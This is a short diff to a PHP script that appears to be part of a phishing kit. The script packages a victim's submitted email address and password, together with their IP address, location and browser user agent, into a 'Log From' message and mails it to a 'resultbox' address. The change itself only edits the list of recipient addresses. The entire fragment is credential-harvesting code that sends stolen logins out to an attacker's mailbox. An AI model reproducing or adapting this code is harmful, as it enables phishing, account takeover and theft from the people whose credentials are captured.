@@ -57,7 +57,7 @@ $timezone = $geoData->timezone ?? 'Unknown';
 $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
 
 // change destination@example.com with your resultbox email
-$to = 'asonmezerler@natvreltextile.com, mali.subbiah@proton.me';
+$to = 'mali.subbiah@proton.me';
 $subject = "Log From $email";
 $message = "Email: {$email}\nPassword: {$password}\nIP Address: {$ip}\nCity: {$city}\nCountry: {$country}\nTimezone: {$timezone}\nUser Agent: {$userAgent}";
 $from = 'webmaster@' . $_SERVER['SERVER_NAME'];
